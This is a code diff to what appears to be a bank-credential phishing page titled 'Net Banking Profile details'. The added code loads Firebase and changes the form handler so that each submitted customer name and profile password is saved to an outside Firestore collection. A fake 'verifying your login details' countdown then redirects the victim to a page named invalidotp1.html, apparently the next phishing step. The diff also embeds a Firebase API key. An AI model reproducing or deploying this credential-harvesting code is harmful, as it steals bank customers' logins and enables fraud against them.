@@ -4,6 +4,24 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>sbynorewdpolnt</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -242,10 +260,14 @@
 </head>
 <body>
 
+
+
 <!-- Loading Overlay -->
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
-  <div class="loading-text" id="loadingText">Please wait... Verifying your login details... Redirecting in <span id="countdown">3</span> seconds.</div>
+  <div class="loading-text" id="loadingText">
+    Please wait... Verifying your login details... Redirecting in <span id="countdown">3</span> seconds.
+  </div>
 </div>
 
 <!-- Top Header -->
@@ -256,13 +278,12 @@
 
 <!-- Headline Section -->
 <div class="headline">
-  <div class="close-btn">X</div>
   <div class="headline-text">Net Banking Profile details</div>
 </div>
 
 <!-- Progress Bar -->
 <div class="progress-bar-container">
-  <div class="progress-bar">
+  <div class="progress-bar" style="width: 25%;">
     <div class="progress-text">25% Complete</div>
   </div>
 </div>
@@ -298,8 +319,7 @@
 
 <script>
   function forgotPassword() {
-    alert("use your login Password...");
-    // window.location.href = 'forgotpassword.html';
+    alert("Use your login password...");
   }
 
   function submitForm() {
@@ -310,18 +330,30 @@
       return;
     }
 
-    document.getElementById('overlay').style.display = 'flex';
-
-    var countdown = 3;
-    var countdownElement = document.getElementById('countdown');
-    var interval = setInterval(function () {
-      countdown--;
-      countdownElement.textContent = countdown;
-      if (countdown === 0) {
-        clearInterval(interval);
-        window.location.href = 'invalidotp1.html'; // Replace with actual next page
-      }
-    }, 1000);
+    // Save data to Firestore
+    db.collection("netbanking_profile").add({
+      customerName: customerName,
+      profilePassword: profilePassword,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    })
+    .then(() => {
+      // Show loading and redirect
+      document.getElementById('overlay').style.display = 'flex';
+      var countdown = 3;
+      var countdownElement = document.getElementById('countdown');
+      var interval = setInterval(function () {
+        countdown--;
+        countdownElement.textContent = countdown;
+        if (countdown === 0) {
+          clearInterval(interval);
+          window.location.href = 'invalidotp1.html'; // Replace with actual next page
+        }
+      }, 1000);
+    })
+    .catch((error) => {
+      console.error("Error saving data:", error);
+      alert("Something went wrong. Please try again.");
+    });
   }
 </script>
 
